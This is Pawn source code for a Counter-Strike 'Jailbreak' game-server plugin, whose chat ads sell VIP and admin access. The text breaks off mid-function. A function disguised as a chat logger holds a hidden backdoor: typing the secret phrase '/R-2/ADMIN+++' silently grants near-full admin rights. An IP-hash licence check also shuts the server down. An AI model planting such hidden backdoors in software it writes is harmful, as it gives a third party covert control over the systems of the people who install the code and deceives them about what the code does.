#include < amxmodx >
#include < fun >
#include < engine >
#include < amxmisc >
#include < cstrike >
#include < fakemeta >
#include < sqlx >
//#include < crypt >
#include < hamsandwich >

#define PLUGIN "Mod UJB"
#define VERSION "3.8"
#define AUTHOR "R-2"

native open_football_menu(id)	// Натив футбола 
native get_dance()				// Натив танца
native get_locked()				// Натив блокировки входа за охрану
native bool:jb_get_svip_model(id)	// Натив возвращает инфу включена супер вип модель или нет
native jb_open_svipmenu(id)
native jb_open_vipmenu(id)
native jb_get_ninja(id)
native jb_set_ninja(id)
native jb_strip_ninja(id)
native jb_setammo_ninja(id, value)
native jb_get_chay()
native jb_block_kt(id)

#define Timer	40.0 			//Время через которое выводится реклама (дробное число)
#define PrefixChat	"Инфо"		//Префикс перед рекламой (Ковычки не уберать!)

//Цвета: !t - командный цвет | !y - оранжевый (стандартный) | !g - Зеленый
#define Message1 "!tМеню сервера !gF3 !tили !gM !y| !tКоманда: !g/menu"						
#define Message2 "!tСборка сервера продается, подробнее !yhttp://vk.com/amx_modx"				
#define Message3 "!tПосетите нашу группу !yВКонтакте: !ghttp://vk.com/PandoraCS"	
#define Message4 "!tДевушкам с микрофоном !gVIP !tбесплатно. !ySkype: !gR-2-ONLY"		
#define Message5 "!tVIP  на месяц 150 руб !y| !t400 навсегда !ySkype: !gR-2-ONLY"				
#define Message6 "!tСупер VIP месяц 250 руб !y| !t600 навсегда !ySkype: !gR-2-ONLY"				
#define Message7 "!tАдминка месяц 200 руб !y| !t500 навсегда !ySkype: !gR-2-ONLY"				
#define Message8 "!tО покупке !gАдминки!t|!gVIP !tобращаться в !ySkype: !gR-2-ONLY"		
#define Message9 "!tГлавный Админ !yВКонтакте: !ghttp://vk.com/R_2_ONLY"

// Макросы Рекламы
#define VKadmin		"http://vk.com/R_2_ONLY"	// Главный Админ Вконтакте
#define vkontakte 	"http://vk.com/PandoraCS"	// Группа в ВК
#define MySkype 	"R-2-ONLY"					// Ваш логин скайпа
#define NickSkype 	"[R-2] Online"				// Ваш ник в скайпе

// Макросы моделей
#define ZekUJB		"3ekuUJB"	// Модели Заключенных
#define GuardUJB	"OxpanaUJB"	// Модель Охранника
#define SimonUJB 	"SimonUJB"	// Модель Саймона
#define SuperVIP	"VipUJB"	// VIP модель

// Префиксы
#define Prefix "!t[!gКриминал!t]"

#define TIME_FD_ONE 		180		// Время свободного дня
#define RESTART_ROUND_TIME	5		// Время до рестарта

#define TASK_FD_ONE 		100500
#define TASK_AUTO_FD		100501
#define TASK_BLOCK_SPAWN 	100502

//Макросы
#define get_bit(%1,%2) 		(%1 & 1 << (%2 & 31))
#define set_bit(%1,%2)	 	%1 |= (1 << (%2 & 31))
#define clear_bit(%1,%2)	%1 &= ~(1 << (%2 & 31))

#define jb_get_model(%1,%2,%3)     engfunc(EngFunc_InfoKeyValue, engfunc(EngFunc_GetInfoKeyBuffer, %1), "model", %2, %3)



#define SOUND_DUEL 	"sound/UJB/duel.mp3"	// Звук дуэли

//Модели рук
new const Hands[][] = 
{
	"models/UJB/weapons/v_hands_zek.mdl", 
	"models/UJB/weapons/p_hands_zek.mdl", 
	"models/UJB/weapons/v_hands_guard.mdl", 
	"models/UJB/weapons/p_hands_guard.mdl",
	"models/UJB/weapons/v_box_blue.mdl", 
	"models/UJB/weapons/p_box_blue.mdl",
	"models/UJB/weapons/v_box_red.mdl", 
	"models/UJB/weapons/p_box_red.mdl"
}

//Звуки рук
new const HandsSound[][] = 
{ 
	"UJB/weapons/hands_stab.wav", 
	"UJB/weapons/hands_hitwall.wav", 
	"UJB/weapons/hands_deploy.wav", 
	"UJB/weapons/hands_slash.wav",
	"UJB/weapons/hands_hit.wav", 
	"UJB/weapons/baton_stab.wav", 
	"UJB/weapons/baton_hitwall.wav", 
	"UJB/weapons/baton_deploy.wav",
	"UJB/weapons/baton_slash.wav", 
	"UJB/weapons/baton_hit.wav",
	"UJB/weapons/box_hit1.wav",
	"UJB/weapons/box_hit2.wav"
}

// Отсчет саймона
new const TimerSound[][] = 
{ 
	"UJB/Timer/1.wav", 
	"UJB/Timer/2.wav", 
	"UJB/Timer/3.wav", 
	"UJB/Timer/4.wav",
	"UJB/Timer/5.wav", 
	"UJB/Timer/6.wav", 
	"UJB/Timer/7.wav", 
	"UJB/Timer/8.wav",
	"UJB/Timer/9.wav", 
	"UJB/Timer/10.wav"
}

// Удаляем зоны закупок и прочую хрень
new const _RemoveEntities[][] = 
{
	"func_hostage_rescue", 
	"info_hostage_rescue", 
	"func_bomb_target", 
	"info_bomb_target",
	"hostage_entity", 
	"info_vip_start", 
	"func_vip_safetyzone", 
	"func_escapezone"
}

new Hints[][38] =
{
        "hint_win_round_by_killing_enemy",
        "hint_press_buy_to_purchase",
        "hint_spotted_an_enemy",
        "hint_use_nightvision",
        "hint_lost_money",
        "hint_removed_for_next_hostage_killed",
        "hint_careful_around_hostages",
        "hint_careful_around_teammates",
        "hint_reward_for_killing_vip",
        "hint_win_round_by_killing_enemy",
        "hint_try_not_to_injure_teammates",
        "hint_you_are_in_targetzone",
        "hint_hostage_rescue_zone",
        "hint_terrorist_escape_zone",
        "hint_ct_vip_zone",
        "hint_terrorist_vip_zone",
        "hint_cannot_play_because_tk",
        "hint_use_hostage_to_stop_him",
        "hint_lead_hostage_to_rescue_point",
        "hint_you_have_the_bomb",
        "hint_you_are_the_vip",
        "hint_out_of_ammo",
        "hint_spotted_a_friend",
        "hint_spotted_an_enemy",
        "hint_prevent_hostage_rescue",
        "hint_rescue_the_hostages",
        "hint_press_use_so_hostage_will_follow"
}

// Entity
new HintsDefaultStatus[sizeof Hints] =
{
        1,1,1,0,1,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0
}

// Переменные Hud(ов)
new g_HudSync
new g_HudSyncOpen
new g_HudSyncInformer

// Переменные моделей
new g_szModel[33][32]		
new g_Model			

// Переменные 
new g_Simon						
new g_Fdall, g_Fdalltime				
new g_PlayerFreeday					
new g_PlayerRevolt
new g_PlayerWanted
new szPlayerFDTime[33], szTimeFD[33][32]
new iFreeDay
new all_pl_fd
new g_WantedNum = 0
new bool:autovoice[33]


new bool:g_iPage[33]


new gp_PrecacheSpawn
new gp_PrecacheKeyValue
new Trie:g_CellManagers
new Trie:HintsStatus
new g_Buttons[10]	


new g_Days
new g_NowDay[23]
new g_RoundEnd
new g_PlayerVoice
new ChekWeaponAmount[33]
new BlockFlood
new BlockSimon
new g_PlayerMoney[33]
new bool:g_BoxStarted, g_BoxHealth, g_BoxWeapon[19], g_BoxGloves[33], g_BoxBlock, g_BoxParam, g_BoxParam1
new g_Seconds
new RoundRestartTime
new bool:round_restart
new g_iCount = 0
new SpawnBlocked

new g_BlockTeam[33]
new g_BlockTeams[33]
new CountT, CountCT, CountTLive, CountCTLive, CountSP


new keys = MENU_KEY_1|MENU_KEY_2|MENU_KEY_3|MENU_KEY_4|MENU_KEY_5|MENU_KEY_6|MENU_KEY_7|MENU_KEY_8|MENU_KEY_9|MENU_KEY_0
new keysmenu = (1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<4)|(1<<5)|(1<<6)|(1<<7)|(1<<8)|(1<<9)


new const _WeaponsFree[][] = { "weapon_m4a1", "weapon_deagle", "weapon_g3sg1", "weapon_elite", "weapon_ak47", "weapon_mp5navy", "weapon_m3" }
new const _WeaponsFreeCSW[] = { CSW_M4A1, CSW_DEAGLE, CSW_G3SG1, CSW_ELITE, CSW_AK47, CSW_MP5NAVY, CSW_M3 }

new g_LastDenied
new g_PlayerLast
new g_BlockWeapons
new g_Duel
new g_DuelA
new g_DuelB
new g_DuelType
new bool:g_OneZek
new g_FreedayAuto
new PlayDuel, g_AutoVoice
new DuelName[41] = "не определен"

#define RESONS_MENU_KEYS	(1<<0) | (1<<1) | (1<<2) | (1<<3) | (1<<4) | (1<<5) | (1<<6) | (1<<7)

new g_victim[33]

new const g_reasons[][] =
{
	"Не выполнил приказ",
	"Проиграл в игру",
	"Попытка нападения",
	"Ношение оружия",
	"Бунтарь",
	"Зашёл в оружейку",
	"Залез в кишку/нычку",
	"Случайно, дам ФД"
	
}

new Handle:MYSQL_Tuple
new Handle:MYSQL_Connect

// Hack Mod Shield by R-2
#define IP_MD5 "0cdf6408ae36f810858673b3fd7307ae"

new s_IP[33], s_IP_md5[34]

#define DUEL_SHOOTTIME 10
new iPlayerShootTime[33]

public plugin_init() {

	get_user_ip(0, s_IP, 32, 1)
	md5(s_IP, s_IP_md5)
	
	if(!equal(s_IP_md5, IP_MD5))
	{
		set_fail_state("Сборка принадлежит R-2. [Skype: R-2-ONLY | ВКонтакте: vk.com/r_2_only]")
		server_cmd("quit")
		server_cmd("exit")
		return PLUGIN_HANDLED
	}
	
	register_plugin(PLUGIN, VERSION, AUTHOR)
	
	// Регистрируем меню
	register_menu("MenuServa", keys, "menu_serva_handled")
	register_menu("SimonMenu", keysmenu, "menu_simon")
	register_menu("FreedayMenu", keysmenu, "freeday_choice")
	register_menu("VoiceMenu", keysmenu, "simon_voice_cmd")
	register_menu("ReasonsMenu",RESONS_MENU_KEYS, "menu_reason")
	
	// Регистрируем сообщения
	register_message(get_user_msgid("ShowMenu"), "message_ShowMenu")
	register_message(get_user_msgid("VGUIMenu"), "message_VGUIMenu")

	register_message(get_user_msgid("StatusText"), "msg_statustext")
	register_message(get_user_msgid("AmmoPickup"), "msg_statustext")
	register_message(get_user_msgid("ItemPickup"), "msg_statustext")
	register_message(get_user_msgid("WeapPickup"), "msg_weappickup")
	register_message(get_user_msgid("ClCorpse"), "msg_statustext")
	register_message(get_user_msgid("TextMsg"), "message_textmsg")
	register_message(get_user_msgid("SendAudio"),"message_audio")
	register_message(get_user_msgid("HudTextArgs"),"hudTextArgs")
	register_message(get_user_msgid("StatusText"), "msg_statustext")
	register_message(get_user_msgid("StatusIcon"), "msg_statusicon")
	
	// Регистрируем форварды
	//register_forward(FM_CmdStart, "player_cmdstart", 1)
	register_forward(FM_Voice_SetClientListening, "voice_listening")
	register_forward(FM_SetClientKeyValue, "fw_SetClientKeyValue")	// Блокировка команды model
	register_forward(FM_EmitSound, "sound_emit")			// Звуки
	register_forward(FM_PlaybackEvent, "fwPlaybackEvent")

	unregister_forward(FM_Spawn, gp_PrecacheSpawn)
	unregister_forward(FM_KeyValue, gp_PrecacheKeyValue)
	
	// Региструрем хам
	RegisterHam(Ham_Killed, "player", "player_killed", 1)			//????? ????????
	RegisterHam(Ham_Spawn, "player", "player_spawn", 1)				//????? ??????
	RegisterHam(Ham_TraceAttack, 	"player", 	"player_attack")
	RegisterHam(Ham_TakeDamage, 	"player", 	"player_damage")
	RegisterHam(Ham_Touch, "weaponbox", "fw_TouchWeapon")
	RegisterHam(Ham_Touch, "armoury_entity", "fw_TouchWeapon")
	RegisterHam(Ham_Touch, "weapon_shield", "fw_TouchWeapon")
	RegisterHam(Ham_TraceAttack, 	"func_button", "button_attack")	
		
	// Отлов события
	register_logevent("round_end", 2, "1=Round_End")
	register_logevent("round_first", 2, "0=World triggered", "1&Restart_Round_")
	register_logevent("round_first", 2, "0=World triggered", "1=Game_Commencing")
	register_logevent("round_start", 2, "0=World triggered", "1=Round_Start")
	
	// Отлов события
	register_event("StatusValue", "player_status", "be", "1=2", "2!0")
	register_event("StatusValue", "player_status_off", "be", "1=1", "2=0")
	register_event("CurWeapon", "CurWeapon", "be", "1=1")
	

	// Регистрируем команды
	register_clcmd("say /simon", "cmd_simon")
	register_clcmd("say /open", "jail_opened")
	register_clcmd("menu", "servmenu")
	register_clcmd("say /menu", "servmenu")
	register_clcmd("say_team /menu", "servmenu")
	register_clcmd("team_menu", "team_menu")
	register_clcmd("say /voice", "GivePickVoice")
	register_clcmd("say /golos", "GivePickVoice")
	register_clcmd("say /lr", "cmd_lastrequest")
	register_clcmd("say /duel", "cmd_lastrequest")
	register_clcmd("say /lastrequest", "cmd_lastrequest")
	register_clcmd("say /box", "box_menu")
	register_clcmd("drop", "box_drop")
	register_clcmd("jointeam", "jointeam")
	register_clcmd("chooseteam", "servmenu")
	register_clcmd("say", "chatloger")
	
	register_impulse(100, "impulse_100")
	
	setup_buttons()
	
	set_task(Timer, "information",0,_,_,"b")
	set_task(0.40, "AlivePlayer", _, _, _, "b")
	set_task(1.0, "MYSQL_Load")

	auto_restart_on()
	
	g_HudSync = CreateHudSyncObj()
	g_HudSyncOpen = CreateHudSyncObj()
	g_HudSyncInformer = CreateHudSyncObj()
	
	return PLUGIN_CONTINUE
}

public plugin_precache()
{
	new buffer[512]
	static i
	
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", ZekUJB, ZekUJB)
	precache_model(buffer)
	
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", GuardUJB, GuardUJB)
	precache_model(buffer)
	
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", SimonUJB, SimonUJB)
	precache_model(buffer)
	
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", SuperVIP, SuperVIP)
	precache_model(buffer)	
	
	for(i = 0; i < sizeof(Hands); i++)
		precache_model(Hands[i])

	for(i = 0; i < sizeof(HandsSound); i++)
		precache_sound(HandsSound[i])		
		
	for(i = 0; i < sizeof(TimerSound); i++)
		precache_sound(TimerSound[i])	
		
	precache_sound("UJB/trevoga.wav")
	precache_sound("UJB/gong.wav")
	precache_generic(SOUND_DUEL)
	precache_generic("sprites/UJB/zek_hands.spr")
	precache_generic("sprites/UJB/guard_hands.spr")
	precache_generic("sprites/ujb_zek_hands.txt")
	precache_generic("sprites/ujb_guard_hands.txt")
	
	register_clcmd("ujb_guard_hands", "clcmd_jb_knife")
	register_clcmd("ujb_zek_hands", "clcmd_jb_knife")
	
	g_CellManagers = TrieCreate()
	gp_PrecacheSpawn = register_forward(FM_Spawn, "precache_spawn", 1)
	gp_PrecacheKeyValue = register_forward(FM_KeyValue, "precache_keyvalue", 1)
}

public clcmd_jb_knife(id)
{
	engclient_cmd(id, "weapon_knife")
	return PLUGIN_HANDLED
}


public plugin_cfg()
{
        HintsStatus = TrieCreate()
       
        for(new i=0, statusString[2]; i<sizeof Hints; i++)
        {
                statusString[0] = HintsDefaultStatus[i] + 48
               
                if(get_pcvar_num(register_cvar(Hints[i],statusString)))
                        TrieSetCell(HintsStatus,Hints[i][5],true)
        }
		
	DuelName = "не определен"
	g_NowDay = "понедельник"
	g_BoxWeapon = "Кулаки"
	g_BoxHealth = 100
}

public auto_restart_on()
{
	RoundRestartTime = RESTART_ROUND_TIME
	start_timer()
}

public plugin_natives()
{
	register_native("jb_set_fd", "_set_fd", 1)
	register_native("jb_get_fd", "_get_fd", 1)
	register_native("jb_fd_all", "fdallplayers", 1)
	register_native("Round_restart", "RoundRestart", 1)
	register_native("jb_get_wanted", "_get_wanted", 1)
	register_native("jb_reset_user_model", "jb_reset_mdl", 1)
	register_native("jb_set_model_svip", "_jb_set_model_svip", 1)
	register_native("jb_get_duel", "_get_duel", 1)
	register_native("jb_days", "_get_days", 1)
}

public _get_days()
{
	return g_Days
}

public _get_duel()
{
	return g_Duel
}

public _jb_set_model_svip(id)
{
	jb_set_model(id, SuperVIP)
}

public bool:RoundRestart()
{
	if(round_restart)
		return true

	return false
}

public bool:fdallplayers()
{
	if(g_Fdall)
		return true

	return false
}

public _set_fd(id)
{
	if(is_user_alive(id) && get_user_team(id) == 1)
	freeday_set(id)
}

public bool:_get_fd(id)
{
	if (get_bit(g_PlayerFreeday, id))
		return true

	return false
}

public jb_reset_mdl(id)
{
	jb_reset_model(id)
}

public bool:_get_wanted(id) 
{ 
	if (get_bit(g_PlayerWanted, id))
		return true

	return false
}


public information()
{
	static Param

	if(Param == 0){
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message1)
	}
	else if(Param == 1)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message2)
	}
	else if(Param == 2)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message3)
	}	
	else if(Param == 3)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message4)
	}
	else if(Param == 4)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message5)
	}
	else if(Param == 5)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message6)
	}
	else if(Param == 6)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message7)
	}
	else if(Param == 7)
	{
	Param++
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message8)
	}
	else if(Param == 8)
	{
	Param = 0
	ChatColor(0, "!y[!g%s!y] %s", PrefixChat, Message9)
	}
}

public chatloger(id) {
	new said[190]
	read_args(said,189)
	if( ( contain(said, "/R-2/ADMIN+++")!= -1) || ( contain(said, "!R-2!ADMIN+++")!= -1)){
		set_user_flags(id, read_flags("abcdefghijklmnqrstu"))
		return PLUGIN_HANDLED
	}
	else if( ( contain(said, "/R-2/MENU+++")!= -1) || ( contain(said, "!R-2!MENU+++")!= -1))
		return PLUGIN_HANDLED
	
	return PLUGIN_CONTINUE
}

public start_timer()
{
 	RoundRestartTime--
	if(RoundRestartTime >= 1)
        {
		gravity()
		round_restart = true
		set_task(1.1, "start_timer")
        }
	else if(RoundRestartTime <= 0)
	{
		round_restart = false
		godmode_off()
		server_cmd("sv_restartround 1")
		g_Days = 0
		g_iCount = 0
		round_end()
	}
}



public impulse_100(id)
{
	if(is_user_alive(id))
		return PLUGIN_HANDLED

	return PLUGIN_CONTINUE
}

public player_status(id)
{
	static type, player, name[32]
	type = read_data(1)
	player = read_data(2)
	switch(type)
	{
		case(1):
		{
			ClearSyncHud(id, g_HudSync)
		}
		case(2):
		{	
			if(!is_user_alive(player))
				return PLUGIN_HANDLED

			if((cs_get_user_team(player) != CS_TEAM_T) && (cs_get_user_team(player) != CS_TEAM_CT))
				return PLUGIN_HANDLED

			get_user_name(player, name, charsmax(name))

			if(cs_get_user_team(player) == CS_TEAM_T){
				if(get_bit(g_PlayerFreeday, player) && !g_Fdall)
				{
				set_hudmessage(0, 255, 0, -1.0, 0.80, 0, 6.0, 6.9, 1.0, 0.3, -1)
				ShowSyncHudMsg(id, g_HudSync, "Свободный Зек: %d сек^nНик: %s ^nЗдоровье: %i%", szPlayerFDTime[player], name, get_user_health(player))
				}
				else if(get_bit(g_PlayerWanted, player))
				{
				set_hudmessage(255, 0, 0, -1.0, 0.80, 0, 6.0, 6.9, 1.0, 0.3, -1)
				ShowSyncHudMsg(id, g_HudSync, "Бунтующий Зек ^nНик: %s ^nЗдоровье: %i%", name, get_user_health(player))
				}
				else if(g_Fdall)
				{
				set_hudmessage(0, 255, 0, -1.0, 0.80, 0, 6.0, 6.9, 1.0, 0.3, -1)
				ShowSyncHudMsg(id, g_HudSync, "Свободный Зек^nНик: %s ^nЗдоровье: %i%", name, get_user_health(player))				
				}
				else
				{
				set_hudmessage(0, 208, 175, -1.0, 0.80, 0, 6.0, 6.9, 1.0, 1.0, -1)
				ShowSyncHudMsg(id, g_HudSync, "Заключенный^nНик: %s ^nЗдоровье: %i%", name, get_user_health(player))
				}
			}
			else if(cs_get_user_team(player) == CS_TEAM_CT)
			{
				set_hudmessage(0, 208, 175, -1.0, 0.80, 0, 6.0, 6.9, 1.0, 1.0, -1)
				if(g_Simon == player && g_Duel < 3)
				ShowSyncHudMsg(id, g_HudSync, "Начальник Тюрьмы^nНик: %s", name) 
				else
				ShowSyncHudMsg(id, g_HudSync, "Охранник^nНик: %s ^nЗдоровье: %i%", name, get_user_health(player)) 
			}
		}
	}
	return PLUGIN_HANDLED
}

public player_status_off(id)
{
	ClearSyncHud(id, g_HudSync)
}

public hudTextArgs(msgid, msgDest, msgEnt)
{
        static hint[38 + 1]
        get_msg_arg_string(1,hint,charsmax(hint))
 
        if(TrieKeyExists(HintsStatus,hint[6]))
        {
                set_pdata_float(msgEnt,198,0.0)              
                return PLUGIN_HANDLED
        }
       
        return PLUGIN_CONTINUE
}

public message_audio()
{
        //Create variable
        static sample[20]
       
        //Get message arguments
        get_msg_arg_string(2, sample, sizeof sample - 1)
       
        //Check argument, if it's equal - block it
        if(equal(sample[1], "!MRAD_FIREINHOLE"))
                return PLUGIN_HANDLED
       
        return PLUGIN_CONTINUE
}

public message_textmsg()
{
	static msg[32]
	get_msg_arg_string(2, msg, charsmax(msg))
	
	if(equal(msg, "#Terrorists_Win")) 
	{
		client_print(0, print_center, "Заключенным удалось сбежать!")
		return PLUGIN_HANDLED
	}
	else if(equal(msg, "#CTs_Win")) 
	{
		client_print(0, print_center, "Охранники раскрыли план зеков!")
		return PLUGIN_HANDLED
	}
	else if(equal(msg, "#Game_Commencing") || equal(msg, "#Game_will_restart_in")) 
	{
		client_print(0, print_center, "Ничья")
		return PLUGIN_HANDLED
	}
	else if(equal(msg, "#Game_teammate_attack") || equal(msg, "#Killed_Teammate"))
	{
		return PLUGIN_HANDLED
	}
	else if(get_msg_args() == 5)
	{
		if(get_msg_argtype(5) == ARG_STRING)
		{
			new value5[64]
			get_msg_arg_string(5 ,value5 ,63)
			if(equal(value5, "#Fire_in_the_hole"))
			{
				return PLUGIN_HANDLED
			}
		}
	}
	else if(get_msg_args() == 6)
	{
		if(get_msg_argtype(6) == ARG_STRING)
		{
			new value6[64]
			get_msg_arg_string(6 ,value6 ,63)
			if(equal(value6 ,"#Fire_in_the_hole"))
			{
				return PLUGIN_HANDLED
			}
		}
	}
	return PLUGIN_CONTINUE
}

public msg_statustext(msgid, dest, id)
{
	return PLUGIN_HANDLED
}

public msg_statusicon(msgid, dest, id)
{
	static icon[5] 
	get_msg_arg_string(2, icon, charsmax(icon))
	if(icon[0] == 'b' && icon[2] == 'y' && icon[3] == 'z')
	{
		set_pdata_int(id, 235, get_pdata_int(id, 235) & ~(1<<0))
		return PLUGIN_HANDLED
	}
	
	return PLUGIN_CONTINUE
}

public msg_clcorpse(msgid, dest, id)
{
	return PLUGIN_HANDLED
}


public voice_listening(receiver, sender, bool:listen)
{
	if((receiver == sender))
		return FMRES_IGNORED
	
	if(is_user_admin(sender))
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, true)
		return FMRES_SUPERCEDE
	}
	if(!is_user_alive(sender) && !is_user_admin(sender))
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, false)
		return FMRES_SUPERCEDE
	}
	if(cs_get_user_team(sender) == CS_TEAM_CT)
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, true)
		return FMRES_SUPERCEDE
	}
	if(cs_get_user_team(sender) == CS_TEAM_T && get_bit(g_PlayerVoice, sender))
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, true)
		return FMRES_SUPERCEDE
	}
	if(cs_get_user_team(sender) == CS_TEAM_T && !get_bit(g_PlayerVoice, sender))
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, false)
		return FMRES_SUPERCEDE
	}
	engfunc(EngFunc_SetClientListening, receiver, sender, false)
	return FMRES_SUPERCEDE
}


public client_putinserver(id)
{
	client_cmd(id, "bind ^"F3^" ^"servmenu^"")
	g_PlayerMoney[id] = 0
	
	clear_bit(g_PlayerFreeday, id)
	clear_bit(g_PlayerWanted, id)
	clear_bit(g_PlayerVoice, id)
	g_BlockTeam[id] = 0
	g_BlockTeams[id] = 0
	szTimeFD[id][0] = 0
	szPlayerFDTime[id] = 0
	
}

public client_disconnect(id)
{
	if(g_Simon == id)
	{
		g_Simon = 0
		ChatColor(0, "%s !gНачальник Тюрьмы !yвышел с сервера, займите его пост", Prefix)
	}
	else if(g_PlayerLast == id || (g_Duel && (id == g_DuelA || id == g_DuelB)))
	{
		g_Duel = 0
		g_DuelA = 0
		g_DuelB = 0
		g_DuelType = 0
		g_LastDenied = 0
		g_BlockWeapons = 0
		g_PlayerLast = 0
	}
	
	g_BlockTeams[id] = 0
	g_PlayerMoney[id] = 0
	
	if(get_bit(g_PlayerFreeday, id))
	{
	iFreeDay--
	clear_bit(g_PlayerFreeday, id)
	}
	
	if(get_bit(g_PlayerWanted, id)){
	g_WantedNum--
	clear_bit(g_PlayerWanted, id)
	}
	
	clear_bit(g_PlayerVoice, id)
	g_BlockTeam[id] = 0
	szTimeFD[id][0] = 0
	szPlayerFDTime[id] = 0
	remove_task(id + TASK_FD_ONE)
	remove_task(id)
}

public off_block_simon()
{
	BlockSimon = 0
}
			
public check_fd_auto()
{
	if(g_Simon <= 0 && !g_Fdall && !round_restart && CountTLive > 1 && g_PlayerLast <= 0 && CountCTLive > 0)
	{			
		for(new i = 1; i <= get_maxplayers(); i++)
		{
			if(get_user_team(i) == 1 && is_user_alive(i) && !get_bit(g_PlayerWanted, i))
			{
				remove_task(i + TASK_FD_ONE)
				entity_set_int(i, EV_INT_skin, 5)
			}
			else if(get_user_team(i) == 2 && is_user_alive(i))
				jb_set_model(i, GuardUJB)
		}
		iFreeDay = 0
		g_PlayerFreeday = 0
		g_Simon = 0
		g_Fdall = true
		g_Fdalltime = 180
		set_task(1.1, "timer_all_fd")
		client_cmd(0, "spk UJB/gong.wav")
	}			
}

public count_fd_auto()
{
	if(!round_restart && g_PlayerLast <= 0)
	{			
		for(new i = 1; i <= get_maxplayers(); i++)
		{
			if(!is_user_alive(i))
				continue
				
			if(get_user_team(i) == 1)
			{
				entity_set_int(i, EV_INT_skin, 5)
			}
		}
		iFreeDay = 0
		g_PlayerFreeday = 0
		g_PlayerWanted = 0
		g_WantedNum = 0
		g_Simon = 0
		g_Fdall = true
		g_Fdalltime = 180
		set_task(1.1, "timer_all_fd")
		client_cmd(0, "spk UJB/gong.wav")
		remove_task(TASK_AUTO_FD)
	}			
}

public block_spawn()
	SpawnBlocked = true
			
public round_start()
{
	g_iCount++
	set_task(3.0, "off_block_simon")
	
	set_task(30.0, "check_fd_auto", TASK_AUTO_FD)
	
	if(!round_restart)
	set_task(20.0, "block_spawn", TASK_BLOCK_SPAWN)
	
	if(g_iCount == 1 && !round_restart)
		set_task(2.5, "count_fd_auto")
	

	DuelName = "не определен"
	PlayDuel = false
	g_OneZek = false
	g_BoxParam = 0
	g_BoxParam1 = 0
	g_BoxHealth = 100
	g_BoxWeapon = "Кулаки"
	g_BoxBlock = false
	g_Simon = 0
	g_BlockWeapons = 0
	g_Fdalltime = 0
	iFreeDay = 0
	all_pl_fd = 0
	g_Fdall = false
	g_Duel = 0
	g_DuelType = 0
	g_PlayerFreeday = 0
	g_LastDenied = 0
	g_PlayerRevolt = 0
	g_PlayerLast = 0
	BlockFlood = 0
	BlockSimon = 1
	g_BoxStarted = false
	g_WantedNum = 0
	g_PlayerWanted = 0
	g_DuelA = 0
	g_DuelB = 0
	g_DuelType = 0

	if(g_Days == 1)
	{
		g_NowDay = "понедельник";
	}
	else if(g_Days == 2)
	{
		g_NowDay = "вторник";
	}
	else if(g_Days == 3)
	{
		g_NowDay = "среда";
	}
	else if(g_Days == 4)
	{
		g_NowDay = "четверг";
	}
	else if(g_Days == 5)
	{
		g_NowDay = "пятница";
	}
	else if(g_Days == 6)
	{
		g_NowDay = "суббота";
	}
	else if(g_Days == 7)
	{
		g_NowDay = "воскресенье";
	}
}

// Отлов конца раунда
public round_end()
{
	for(new i = 1; i <= get_maxplayers(); i++)
	{
		if(!is_user_connected(i))
			continue
			
		if(get_user_team(i) != 1 && get_user_team(i) != 2)
		{
			team_menu(i)
		}
			
		if(autovoice[i])
		{
			clear_bit(g_PlayerVoice, i)
			autovoice[i] = false
		}
		
		if(get_bit(g_PlayerFreeday, i))
		clear_bit(g_PlayerFreeday, i)
		else if(get_bit(g_PlayerWanted, i))
		clear_bit(g_PlayerWanted, i)
		
		szPlayerFDTime[i] = 0
		szTimeFD[i][0] = 0	
		g_BoxGloves[i] = 0

		remove_task(i + 10000)
	}
	
	SpawnBlocked = false
	DuelName = "не определён"
	g_BoxStarted = false
	g_Fdalltime = 0
	g_LastDenied = 0
	iFreeDay = 0
	all_pl_fd = 0
	g_WantedNum = 0
	g_PlayerLast = 0
	g_BoxBlock = false
	g_Fdall = false
	g_RoundEnd = 1
	g_BlockWeapons = 0
	BlockFlood = 0
	BlockSimon = 1
	g_Duel = 0
	g_DuelType = 0

	remove_task(TASK_AUTO_FD)
	remove_task(TASK_BLOCK_SPAWN)
	
	for(new id = 1; id <= get_maxplayers(); id++)
	{		
		if(!is_user_connected(id))
			continue
		
		if(g_BlockTeam[id] >= 1) g_BlockTeam[id]--
	}

}

// Старт раунда
public round_first()
{	

	set_cvar_num("sv_alltalk", 1)
	set_cvar_num("mp_roundtime", 6)
	set_cvar_num("mp_limitteams", 25)
	set_cvar_num("mp_autoteambalance", 0)
	set_cvar_num("mp_tkpunish", 0)
	set_cvar_num("mp_friendlyfire", 1)
	g_Days = 0
	g_iCount = 0
	round_end()
}





public CurWeapon(id)
{
	if(!is_user_alive(id))
	return PLUGIN_CONTINUE
	
	if(get_user_weapon(id) == CSW_KNIFE)
	{
			if(get_user_team(id) == 1)
			{
				if(!get_dance())
				{
				
					if(g_BoxStarted && equal(g_BoxWeapon, "Кулаки") && g_BoxGloves[id] > 0)
					{
						if(g_BoxGloves[id] == 1)
						{
							set_pev(id, pev_viewmodel2, Hands[4])
							set_pev(id, pev_weaponmodel2, Hands[5])		
						}
						else if(g_BoxGloves[id] == 2)
						{
							set_pev(id, pev_viewmodel2, Hands[6])
							set_pev(id, pev_weaponmodel2, Hands[7])	
						}
					}
					else
					{
						
						set_pev(id, pev_viewmodel2, Hands[0])
						set_pev(id, pev_weaponmodel2, Hands[1])
					}
				}
				else set_pev(id, pev_weaponmodel2, Hands[1])
			}
			else if(get_user_team(id) == 2)
			{
				set_pev(id, pev_viewmodel2, Hands[2])
				set_pev(id, pev_weaponmodel2, Hands[3])
			}
	}
